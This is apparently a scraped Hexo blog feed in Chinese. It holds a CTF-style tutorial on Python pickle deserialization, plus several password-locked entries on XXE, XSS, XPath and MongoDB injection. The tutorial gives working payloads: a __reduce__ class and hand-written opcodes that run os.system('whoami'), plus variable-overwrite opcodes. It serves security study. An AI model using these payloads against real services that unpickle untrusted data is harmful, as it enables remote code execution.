class="hljs-built_in">return</span> <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p>被解析为：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">b<span class="hljs-string">&quot;S&#x27;123&#x27;<span class="hljs-subst">\n</span>p0<span class="hljs-subst">\n</span>0g0<span class="hljs-subst">\n</span>.&quot;</span><br></code></pre></td></tr></table></figure><h4 id="pker：全局变量覆盖"><a href="#pker：全局变量覆盖" class="headerlink" title="pker：全局变量覆盖"></a>pker：全局变量覆盖</h4><ul><li>覆盖直接由执行文件引入的<code>secret</code>模块中的<code>name</code>与<code>category</code>变量：</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">secret</span>=GLOBAL(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;secret&#x27;</span>) <br><span class="hljs-comment"># python的执行文件被解析为__main__对象，secret在该对象从属下</span><br><span class="hljs-attr">secret.name</span>=<span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-attr">secret.category</span>=<span class="hljs-string">&#x27;2&#x27;</span><br></code></pre></td></tr></table></figure><ul><li>覆盖引入模块的变量：</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">game</span> = GLOBAL(<span class="hljs-string">&#x27;guess_game&#x27;</span>, <span class="hljs-string">&#x27;game&#x27;</span>)<br><span class="hljs-attr">game.curr_ticket</span> = <span class="hljs-string">&#x27;123&#x27;</span><br></code></pre></td></tr></table></figure><p>接下来会给出一些具体的基本操作的实例。</p><h4 id="pker：函数执行"><a href="#pker：函数执行" class="headerlink" title="pker：函数执行"></a>pker：函数执行</h4><ul><li>通过<code>b&#39;R&#39;</code>调用：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">s<span class="hljs-operator">=</span><span class="hljs-string">&#x27;whoami&#x27;</span><br><span class="hljs-keyword">system</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>)<br><span class="hljs-keyword">system</span>(s) # `b<span class="hljs-string">&#x27;R&#x27;</span>`调用<br><span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure><ul><li>通过<code>b&#39;i&#39;</code>调用：</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">INST</span><span class="hljs-params">(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;whoami&#x27;</span>)</span></span><br></code></pre></td></tr></table></figure><ul><li>通过<code>b&#39;c&#39;</code>与<code>b&#39;o&#39;</code>调用：</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">OBJ</span><span class="hljs-params">(GLOBAL(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>)</span></span>, <span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><ul><li>多参数调用函数</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">INST</span><span class="hljs-params">(<span class="hljs-string">&#x27;[module]&#x27;</span>, <span class="hljs-string">&#x27;[callable]&#x27;</span>[, par0,par1...])</span></span><br><span class="hljs-function"><span class="hljs-title">OBJ</span><span class="hljs-params">(GLOBAL(<span class="hljs-string">&#x27;[module]&#x27;</span>, <span class="hljs-string">&#x27;[callable]&#x27;</span>)</span></span><span class="hljs-selector-attr">[, par0,par1...]</span>)<br></code></pre></td></tr></table></figure><h4 id="pker：实例化对象"><a href="#pker：实例化对象" class="headerlink" title="pker：实例化对象"></a>pker：实例化对象</h4><ul><li>实例化对象是一种特殊的函数执行</li></ul><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs autoit">animal = INST(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;Animal&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-keyword">return</span> animal<br><br><br><span class="hljs-meta"># 或者</span><br><br>animal = OBJ(<span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;Animal&#x27;</span>), <span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-keyword">return</span> animal<br></code></pre></td></tr></table></figure><ul><li>其中，python原文件中包含：</li></ul><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>, name, category</span>):<br>        <span class="hljs-variable language_">self</span>.name = name<br>        <span class="hljs-variable language_">self</span>.category = category<br></code></pre></td></tr></table></figure><ul><li>也可以先实例化再赋值：</li></ul><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">animal = INST(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;Animal&#x27;</span>)<br>animal.name=<span class="hljs-string">&#x27;1&#x27;</span><br>animal.category=<span class="hljs-string">&#x27;2&#x27;</span><br><span class="hljs-keyword">return</span> animal<br></code></pre></td></tr></table></figure><h4 id="手动辅助"><a href="#手动辅助" class="headerlink" title="手动辅助"></a>手动辅助</h4><ul><li>拼接opcode：将第一个pickle流结尾表示结束的<code>.</code>去掉，两者拼接起来即可。</li><li>建立普通的类时，可以先pickle.dumps，再拼接至payload。</li></ul><p>参考： <a href="https://xz.aliyun.com/news/6608">https://xz.aliyun.com/news/6608</a> </p>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>opcode</tag>
      
      <tag>pickle</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Xpath指北</title>
    <link href="/2025/01/26/Xpath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/"/>
    <url>/2025/01/26/Xpath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请重试。" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="7869322cd2f3a4a47a6667fc040f32d0d4ce37f56b1f92c983f21d9058994578">7389a4e37e9dabc8af72228f567f583bc6e4d75b1af1692aeba085d25c8638eb</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">此文章已加密或未写完，请输入密码以查看全文内容。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Xpath注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xxe指北</title>
    <link href="/2025/01/26/xxe%E6%8C%87%E5%8C%97/"/>
    <url>/2025/01/26/xxe%E6%8C%87%E5%8C%97/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请重试。" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="b53c19b66ca7debee8ec846570c8462fc5f8413e74213acfa13f2ad86b878447">7389a4e37e9dabc8af72228f567f583bef62c9a4a6fdd6cca750ba72693957ded54d803a165f2834f6fb605cb5bf53cd55f2c9f326d2060d29085156d8630dbbbd17cc0b36776df8c21697c186dec117d86b615424e5d8d27b98505c3dc070d40c7c97ee1744f7ae77e897f68553e4b680e87e79dab8dd5317b009378a9d14c54f1d66ebd940ea89d8d7e1bd3e0e0fb8ca22942ea8f480b37ae62e807c01ad9a</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">此文章已加密或未写完，请输入密码以查看全文内容。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xxe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss指北</title>
    <link href="/2025/01/26/xss%E6%8C%87%E5%8C%97/"/>
    <url>/2025/01/26/xss%E6%8C%87%E5%8C%97/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请重试。" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="7869322cd2f3a4a47a6667fc040f32d0d4ce37f56b1f92c983f21d9058994578">7389a4e37e9dabc8af72228f567f583bc6e4d75b1af1692aeba085d25c8638eb</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">此文章已加密或未写完，请输入密码以查看全文内容。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MongDB注入指北</title>
    <link href="/2025/01/26/MongDB%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/"/>
    <url>/2025/01/26/MongDB%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请重试。" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="7869322cd2f3a4a47a6667fc040f32d0d4ce37f56b1f92c983f21d9058994578">7389a4e37e9dabc8af72228f567f583bc6e4d75b1af1692aeba085d25c8638eb</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">此文章已加密或未写完，请输入密码以查看全文内容。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MangDB注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pickle反序列化</title>
    <link href="/2025/01/25/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2025/01/25/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="什么是pickle"><a href="#什么是pickle" class="headerlink" title="什么是pickle"></a>什么是pickle</h1><ul><li><p>pickle实际上是一门栈语言</p></li><li><p>与PHP类似，python也有序列化功能以长期储存内存中的数据。pickle是python下的序列化与反序列化包</p></li><li><p>与json相比，pickle以二进制储存，不易人工阅读；json可以跨语言，而pickle是Python专用的；pickle能表示python几乎所有的类型（包括自定义类型），json只能表示一部分内置类型且不能表示自定义类型。</p></li><li><p>pickle实际上可以看作一种<strong>独立的语言</strong>，通过对opcode的更改编写可以执行python代码、覆盖变量等操作。直接编写的opcode灵活性比使用pickle序列化生成的代码更高，有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）。</p></li></ul><h2 id="可序列化的对象"><a href="#可序列化的对象" class="headerlink" title="可序列化的对象"></a>可序列化的对象</h2><ul><li><code>None</code> 、 <code>True</code> 和 <code>False</code></li><li>整数、浮点数、复数</li><li>str、byte、bytearray</li><li>只包含可封存对象的集合，包括 tuple、list、set 和 dict</li><li>定义在模块最外层的函数（使用 def 定义，lambda 函数则不可以）</li><li>定义在模块最外层的内置函数</li><li>定义在模块最外层的类</li><li><code>__dict__</code> 属性值或 <code>__getstate__()</code> 函数的返回值可以被序列化的类（详见官方文档的Pickling Class Instances）</li></ul><h2 id="object-reduce-函数"><a href="#object-reduce-函数" class="headerlink" title="object.__reduce__() 函数"></a><code>object.__reduce__()</code> 函数</h2><ul><li>在开发时，可以通过重写类的 <code>object.__reduce__()</code> 函数，使之在被实例化时按照重写的方式进行。具体而言，python要求 <code>object.__reduce__()</code> 返回一个 <code>(callable, ([para1,para2...])[,...])</code> 的元组，每当该类的对象被unpickle时，该callable就会被调用以生成对象（该callable其实是构造函数）。</li><li>在下文pickle的opcode中， <code>R</code> 的作用与 <code>object.__reduce__()</code> 关系密切：选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数。其实 <code>R</code> 正好对应 <code>object.__reduce__()</code> 函数， <code>object.__reduce__()</code> 的返回值会作为 <code>R</code> 的作用对象，当包含该函数的对象被pickle序列化时，得到的字符串是包含了 <code>R</code> 的。</li></ul><h1 id="pickle过程详细解读"><a href="#pickle过程详细解读" class="headerlink" title="pickle过程详细解读"></a>pickle过程详细解读</h1><ul><li>pickle解析依靠Pickle Virtual Machine (PVM)进行。</li><li>PVM涉及到三个部分：1. 解析引擎 2. 栈 3. 内存：</li><li>解析引擎：从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 <code>.</code> 停止。最终留在栈顶的值将被作为反序列化对象返回。</li><li>栈：由Python的list实现，被用来临时存储数据、参数以及对象。</li><li>memo：由Python的dict实现，为PVM的生命周期提供存储。说人话：将反序列化完成的数据以 <code>key-value</code> 的形式储存在memo中，以便后来使用。</li><li>PVM解析 <code>str</code> 的过程动图：</li></ul><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/20200320230631-6204866e-6abc-1.gif" alt="img"></p><ul><li><p>PVM解析 <code>__reduce__()</code> 的过程动图：</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/20200320230711-7972c0ea-6abc-1.gif" alt="img"></p></li></ul><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>pickle EXP的简单demo</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">genpoc</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        s = <span class="hljs-string">&quot;&quot;&quot;echo test &gt;poc.txt&quot;&quot;&quot;</span>  <span class="hljs-comment"># 要执行的命令</span><br>        <span class="hljs-keyword">return</span> os.system, (s,)        <span class="hljs-comment"># reduce函数必须返回元组或字符串</span><br><br>e = genpoc()<br>poc = pickle.dumps(e)<br><br><span class="hljs-built_in">print</span>(poc) <span class="hljs-comment"># 此时，如果 pickle.loads(poc)，就会执行命令</span><br></code></pre></td></tr></table></figure><p>变量覆盖</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><br>key1 = <span class="hljs-string">b&#x27;321&#x27;</span><br>key2 = <span class="hljs-string">b&#x27;123&#x27;</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">exec</span>,(<span class="hljs-string">&quot;key1=b&#x27;1&#x27;\nkey2=b&#x27;2&#x27;&quot;</span>,))<br><br>a = A()<br>pickle_a = pickle.dumps(a)<br><span class="hljs-built_in">print</span>(pickle_a)<br>pickle.loads(pickle_a)<br><span class="hljs-built_in">print</span>(key1, key2) <span class="hljs-comment">#覆盖</span><br></code></pre></td></tr></table></figure><h1 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h1><ul><li>在CTF中，很多时候需要一次执行多个函数或一次进行多个指令，此时就不能光用 <code>__reduce__</code> 来解决问题（reduce一次只能执行一个函数，当exec被禁用时，就不能一次执行多条指令了），而需要手动拼接或构造opcode了。手写opcode是pickle反序列化比较难的地方。</li><li>在这里可以体会到为何pickle<strong>是一种语言</strong>，直接编写的opcode灵活性比使用pickle序列化生成的代码更高，只要符合pickle语法，就可以进行变量覆盖、函数执行等操作。</li><li>根据前文不同版本的opcode可以看出，版本0的opcode更方便阅读，所以手动编写时，一般选用版本0的opcode。下文中，所有opcode为版本0的opcode</li></ul><h2 id="常用opcode解析"><a href="#常用opcode解析" class="headerlink" title="常用opcode解析"></a>常用opcode解析</h2><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/20200320230711-7972c0ea-6abc-1.gif" alt="img"></p><p>常用的opcode如下：完整的可在<code>$PYTHON/Lib/pickle.py</code>查看</p><table><thead><tr><th>opcode</th><th>描述</th><th>具体写法</th><th>栈上的变化</th><th>memo上的变化</th></tr></thead><tbody><tr><td>c</td><td>获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）</td><td>c[module]\n[instance]\n</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>o</td><td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td><td>o</td><td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td><td>无</td></tr><tr><td>i</td><td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td><td>i[module]\n[callable]\n</td><td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td><td>无</td></tr><tr><td>N</td><td>实例化一个None</td><td>N</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>S</td><td>实例化一个字符串对象</td><td>S’xxx’\n（也可以使用双引号、&#39;等python字符串形式）</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>V</td><td>实例化一个UNICODE字符串对象</td><td>Vxxx\n</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>I</td><td>实例化一个int对象</td><td>Ixxx\n</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>F</td><td>实例化一个float对象</td><td>Fx.x\n</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>R</td><td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td><td>R</td><td>函数和参数出栈，函数的返回值入栈</td><td>无</td></tr><tr><td>.</td><td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td><td>.</td><td>无</td><td>无</td></tr><tr><td>(</td><td>向栈中压入一个MARK标记</td><td>(</td><td>MARK标记入栈</td><td>无</td></tr><tr><td>t</td><td>寻找栈中的上一个MARK，并组合之间的数据为元组</td><td>t</td><td>MARK标记以及被组合的数据出栈，获得的对象入栈</td><td>无</td></tr><tr><td>)</td><td>向栈中直接压入一个空元组</td><td>)</td><td>空元组入栈</td><td>无</td></tr><tr><td>l</td><td>寻找栈中的上一个MARK，并组合之间的数据为列表</td><td>l</td><td>MARK标记以及被组合的数据出栈，获得的对象入栈</td><td>无</td></tr><tr><td>]</td><td>向栈中直接压入一个空列表</td><td>]</td><td>空列表入栈</td><td>无</td></tr><tr><td>d</td><td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td><td>d</td><td>MARK标记以及被组合的数据出栈，获得的对象入栈</td><td>无</td></tr><tr><td>}</td><td>向栈中直接压入一个空字典</td><td>}</td><td>空字典入栈</td><td>无</td></tr><tr><td>p</td><td>将栈顶对象储存至memo_n</td><td>pn\n</td><td>无</td><td>对象被储存</td></tr><tr><td>g</td><td>将memo_n的对象压栈</td><td>gn\n</td><td>对象被压栈</td><td>无</td></tr><tr><td>0</td><td>丢弃栈顶对象</td><td>0</td><td>栈顶对象被丢弃</td><td>无</td></tr><tr><td>b</td><td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td><td>b</td><td>栈上第一个元素出栈</td><td>无</td></tr><tr><td>s</td><td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td><td>s</td><td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td><td>无</td></tr><tr><td>u</td><td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td><td>u</td><td>MARK标记以及被组合的数据出栈，字典被更新</td><td>无</td></tr><tr><td>a</td><td>将栈的第一个元素append到第二个元素(列表)中</td><td>a</td><td>栈顶元素出栈，第二个元素（列表）被更新</td><td>无</td></tr><tr><td>e</td><td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td><td>e</td><td>MARK标记以及被组合的数据出栈，列表被更新</td><td>无</td></tr></tbody></table><p>此外， <code>TRUE</code> 可以用 <code>I</code> 表示： <code>b&#39;I01\n&#39;</code> ； <code>FALSE</code> 也可以用 <code>I</code> 表示： <code>b&#39;I00\n&#39;</code> ，其他opcode可以在<a href="https://github.com/python/cpython/blob/master/Lib/pickle.py#L111">pickle库的源代码</a>中找到。</p><p>用这些opcode我们可以得到一些需要注意的地方：</p><ul><li>编写opcode时要想象栈中的数据，以正确使用每种opcode。</li><li>在理解时注意与python本身的操作对照（比如python列表的<code>append</code>对应<code>a</code>、<code>extend</code>对应<code>e</code>；字典的<code>update</code>对应<code>u</code>）。</li><li><code>c</code>操作符会尝试<code>import</code>库，所以在<code>pickle.loads</code>时不需要漏洞代码中先引入系统库。</li><li>pickle不支持列表索引、字典索引、点号取对象属性作为<strong>左值</strong>，需要索引时只能先获取相应的函数（如<code>getattr</code>、<code>dict.get</code>）才能进行。但是因为存在<code>s</code>、<code>u</code>、<code>b</code>操作符，<strong>作为右值是可以的</strong>。即“查值不行，赋值可以”。pickle能够索引查值的操作只有<code>c</code>、<code>i</code>。而如何查值也是CTF的一个重要考点。</li><li><code>s</code>、<code>u</code>、<code>b</code>操作符可以构造并赋值原来没有的属性、键值对。</li></ul><h4 id="拼接opcode"><a href="#拼接opcode" class="headerlink" title="拼接opcode"></a>拼接opcode</h4><p>将第一个pickle流结尾表示结束的 <code>.</code> 去掉，将第二个pickle流与第一个拼接起来即可。</p><h4 id="全局变量覆盖"><a href="#全局变量覆盖" class="headerlink" title="全局变量覆盖"></a>全局变量覆盖</h4><p>python源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># secret.py</span><br>name=<span class="hljs-string">&#x27;TEST3213qkfsmfo&#x27;</span><br><span class="hljs-comment"># main.py</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> secret<br><br>opcode=<span class="hljs-string">&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">(S&#x27;name&#x27;</span><br><span class="hljs-string">S&#x27;1&#x27;</span><br><span class="hljs-string">db.&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;before:&#x27;</span>,secret.name)<br><br>output=pickle.loads(opcode.encode())<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;output:&#x27;</span>,output)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;after:&#x27;</span>,secret.name)<br></code></pre></td></tr></table></figure><p>这段字节码的含义是：</p><ol><li><code>c__main__\nsecret\n</code>：<ul><li>从 <code>__main__</code> 模块中获取 <code>secret</code> 对象。</li></ul></li><li><code>(S&#39;name&#39;\nS&#39;1&#39;\ndb.</code>：<ul><li>创建一个字典 <code>&#123;&#39;name&#39;: &#39;1&#39;&#125;</code>，并将其赋值给 <code>secret</code> 对象的 <code>__dict__</code> 属性。</li></ul></li></ol><p>使用到的payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">opcode=<span class="hljs-string">&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">(S&#x27;name&#x27;</span><br><span class="hljs-string">S&#x27;1&#x27;</span><br><span class="hljs-string">db.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="函数执行"><a href="#函数执行" class="headerlink" title="函数执行"></a>函数执行</h4><p>与函数执行相关的opcode有三个： <code>R</code> 、 <code>i</code> 、 <code>o</code> ，所以我们可以从三个方向进行构造：</p><ol><li><code>R</code> ：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;&#x27;&#x27;cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">(S&#x27;whoami&#x27;</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">cos：</span><br><span class="hljs-string">从 os 模块中获取 system 函数。</span><br><span class="hljs-string">system：</span><br><span class="hljs-string">调用 os.system 函数。</span><br><span class="hljs-string">(S&#x27;whoami&#x27;：</span><br><span class="hljs-string">将字符串 &#x27;whoami&#x27; 作为参数传递给 os.system。</span><br><span class="hljs-string">tR.</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><ol start="2"><li><code>i</code> ：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span><br><span class="hljs-string">ios</span><br><span class="hljs-string">system</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br><br>(S<span class="hljs-string">&#x27;whoami&#x27;</span>\nios\nsystem\n.：<br>S<span class="hljs-string">&#x27;whoami&#x27;</span>：表明这是一个字符串，值为 <span class="hljs-string">&#x27;whoami&#x27;</span>。<br>ios 和 system：指向 Python 模块 os 的 system 方法。<br>.：表示序列化结束<br></code></pre></td></tr></table></figure><ol start="3"><li><code>o</code> ：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 